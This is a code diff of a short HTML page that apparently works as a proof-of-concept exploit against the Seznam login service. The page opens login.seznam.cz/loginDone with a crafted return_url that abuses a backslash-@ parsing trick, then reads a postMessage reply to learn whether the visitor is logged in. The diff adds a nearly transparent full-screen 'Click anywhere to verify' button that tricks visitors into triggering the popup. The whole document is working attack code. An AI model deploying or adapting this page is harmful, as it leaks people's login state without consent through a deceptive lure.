@@ -1,18 +1,25 @@
 <!DOCTYPE html>
-<body><h1 id="out">Checking...</h1>
+<button onclick="run()" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.1">
+    Click anywhere to verify
+</button>
+<h1 id="out">Waiting...</h1>
 <script>
+function run() {
   const url = `https://login.seznam.cz/loginDone?return_url=${encodeURIComponent(location.origin + "\\@seznam.cz")}`;
-  const win = open(url, "_blank", "width=1,height=1");
-  const timer = setTimeout(() => { win.close(); out.innerText = "Not Logged In"; }, 3000);
+  const win = open(url, "w", "width=100,height=100");
+  const timer = setTimeout(() => { 
+      if(win) win.close(); 
+      out.innerText = "Not Logged In"; 
+  }, 2000);
   onmessage = e => {
     try {
       if (JSON.parse(e.data).status === 200) {
         clearTimeout(timer);
-        win.close();
+        if(win) win.close();
         out.innerText = "Logged In!";
         out.style.color = "green";
       }
     } catch {}
   };
+}
 </script>
-</body>
